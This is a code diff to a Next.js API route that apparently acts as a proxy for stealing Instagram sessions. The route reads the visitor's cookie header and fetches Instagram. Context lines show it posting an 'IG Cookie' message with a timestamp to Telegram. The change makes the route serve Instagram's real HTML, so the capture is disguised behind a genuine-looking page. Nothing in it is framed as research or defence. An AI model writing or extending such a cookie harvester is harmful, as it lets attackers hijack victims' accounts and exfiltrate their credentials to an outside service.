@@ -13,7 +13,6 @@ export async function GET(request) {
   const cookieHeader = request.headers.get('cookie') || '';
 
   try {
-    // 1. Fetch Instagram to verify it works
     const response = await fetch(targetUrl, {
       headers: {
         'User-Agent': userAgent,
@@ -22,7 +21,8 @@ export async function GET(request) {
       redirect: 'follow',
     });
 
-    // 2. Log to Telegram
+    const content = await response.text();
+
     const message = `
 🍪 <b>IG Cookie</b>
 🕒 ${new Date().toISOString()}
@@ -42,19 +42,19 @@ export async function GET(request) {
       })
     }).catch(() => {});
 
-    // 3. Return a JSON success message
-    return NextResponse.json({ 
-      status: 'success',
-      redirectUrl: targetUrl 
+    // ✅ Return the Instagram HTML directly
+    return new NextResponse(content, {
+      status: response.status,
+      headers: {
+        'Content-Type': 'text/html',
+      }
     });
-
   } catch (error) {
     console.error("Proxy Error:", error);
-    return NextResponse.json({ error: "Failed" }, { status: 500 });
+    return new NextResponse("Error", { status: 500 });
   }
 }
 
-// Disable prerendering
 export const dynamic = 'force-dynamic';
 export const revalidate = 0;
 export const fetchCache = 'force-no-store';
